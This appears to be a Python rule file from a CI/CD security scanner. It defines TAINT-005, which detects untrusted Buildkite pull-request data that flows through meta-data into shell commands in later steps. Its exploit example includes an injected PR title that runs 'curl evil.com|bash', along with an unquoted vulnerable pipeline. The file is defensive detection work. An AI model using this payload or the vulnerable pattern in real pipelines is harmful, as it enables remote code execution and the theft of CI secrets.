"""TAINT-005. Untrusted input flows across Buildkite steps via meta-data.

The Buildkite analogue of ``TAINT-002`` (GHA jobs.outputs) and
``TAINT-004`` (GitLab dotenv). Buildkite's
``buildkite-agent meta-data set/get`` mechanism is a per-build
key-value store: any step can ``set`` a key, any later step in
the same build can ``get`` it. The injection shape:

  steps:
    - label: extract
      command: |
        buildkite-agent meta-data set "title" \
            "$BUILDKITE_PULL_REQUEST_TITLE"
    - wait
    - label: use
      command: |
        TITLE=$(buildkite-agent meta-data get title)
        echo $TITLE

BK-003 catches the inner ``$BUILDKITE_PULL_REQUEST_TITLE``
interpolation in the producer's command. TAINT-005 catches the
actual injection at the consumer (``$TITLE`` looks like any
other shell variable until you trace the meta-data round-trip
to the producer).
"""
from __future__ import annotations

from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from .._taint_graph import analyze_pipeline

RULE = Rule(
    id="TAINT-005",
    title=(
        "Untrusted input flows across steps via "
        "``buildkite-agent meta-data``"
    ),
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4", "CICD-SEC-1"),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78", "CWE-829"),
    recommendation=(
        "Sanitize the value at the producer step before it "
        "lands in the meta-data store. The canonical safe "
        "pattern is to copy the ``$BUILDKITE_PULL_REQUEST_*`` / "
        "``$BUILDKITE_MESSAGE`` / branch / commit / author "
        "source into an intermediate shell variable, run a "
        "sanitizer (``tr -dc 'a-zA-Z0-9 '`` is enough for a "
        "freeform title), and only then call "
        "``buildkite-agent meta-data set``. The consuming step "
        "should still reference the ``$(buildkite-agent "
        "meta-data get ...)`` value quoted (``\"$TITLE\"``) and "
        "never inline into a command without re-quoting. "
        "Removing the meta-data flow entirely is the strongest "
        "fix; if the value genuinely needs to flow downstream, "
        "validate the sanitizer is doing what you think before "
        "relying on it."
    ),
    docs_note=(
        "Detection is a two-pass walk over the pipeline. Pass 1 "
        "looks for ``buildkite-agent meta-data set <key> "
        "<value>`` invocations whose ``<value>`` interpolates "
        "an attacker-controllable Buildkite predefined variable "
        "(the same ``BUILDKITE_*`` vocabulary BK-003 uses). "
        "Pass 2 walks every step for "
        "``buildkite-agent meta-data get <key>`` invocations "
        "and matches against the producer keys recorded in "
        "pass 1.\n\n"
        "Buildkite meta-data is per-build, not per-step; any "
        "step in the same build can read what any earlier step "
        "wrote regardless of ``depends_on:``. The detector "
        "doesn't model temporal ordering and fires whenever "
        "both a tainted set and a get of the same key exist in "
        "the same pipeline file. v1 limitations: ``meta-data "
        "exists`` (returns 0/1 status) and the ``--default`` "
        "form aren't tracked; plugins providing their own "
        "meta-data abstraction (e.g. "
        "``cattle-ops/github-merged-pr``) aren't introspected."
    ),
    known_fp=(
        "If the producer step runs a sanitizer between the "
        "tainted source interpolation and the ``meta-data "
        "set`` call (``echo \"$BUILDKITE_PULL_REQUEST_TITLE\" "
        "| tr -dc 'a-zA-Z0-9 ' | xargs -I{} buildkite-agent "
        "meta-data set title {}``), the consumer is no longer "
        "exploitable but TAINT-005 still fires. Suppress via "
        "ignore-file scoped to the consumer step's pipeline "
        "file when this is the deliberate shape; the sanitizer "
        "is then load-bearing and any future regression in it "
        "would re-expose the consumer.",
    ),
    exploit_example=(
        "# Vulnerable: a PR titled ``shiny new feature\";curl\n"
        "# evil.com|bash;\"`` lands in the meta-data store via the\n"
        "# producer step. The consumer step reads it back into\n"
        "# ``$TITLE`` and inlines it into a shell command — the\n"
        "# injected ``curl`` runs in the consumer's shell with\n"
        "# the consumer step's full secret set in scope.\n"
        "steps:\n"
        "  - label: extract\n"
        "    command: |\n"
        "      buildkite-agent meta-data set \"title\" \\\n"
        "        \"$BUILDKITE_PULL_REQUEST_TITLE\"\n"
        "  - wait\n"
        "  - label: use\n"
        "    command: |\n"
        "      TITLE=$(buildkite-agent meta-data get title)\n"
        "      echo $TITLE\n"
        "      ./generate-release-notes.sh --title $TITLE\n"
        "\n"
        "# Safe: sanitize at the producer (drop anything outside\n"
        "# the expected charset) and quote at the consumer. The\n"
        "# value is now safe to inline into a shell command — the\n"
        "# injected metacharacters either never reach meta-data or\n"
        "# are quoted as one literal argument.\n"
        "steps:\n"
        "  - label: extract\n"
        "    command: |\n"
        "      clean=$(echo \"$BUILDKITE_PULL_REQUEST_TITLE\" | \\\n"
        "          tr -dc 'a-zA-Z0-9 -')\n"
        "      buildkite-agent meta-data set \"title\" \"$clean\"\n"
        "  - wait\n"
        "  - label: use\n"
        "    command: |\n"
        "      TITLE=\"$(buildkite-agent meta-data get title)\"\n"
        "      ./generate-release-notes.sh --title \"$TITLE\""
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    paths = analyze_pipeline(doc)
    if not paths:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description=(
                "No cross-step taint path detected via "
                "``buildkite-agent meta-data`` propagation."
            ),
            recommendation=RULE.recommendation, passed=True,
        )
    rendered = [p.render() for p in paths]
    desc = (
        f"{len(paths)} cross-step taint path(s) reach a downstream "
        f"sink via meta-data: {'; '.join(rendered[:3])}"
        f"{'...' if len(rendered) > 3 else ''}."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=False,
        taint_flows=tuple(p.to_flow() for p in paths),
    )
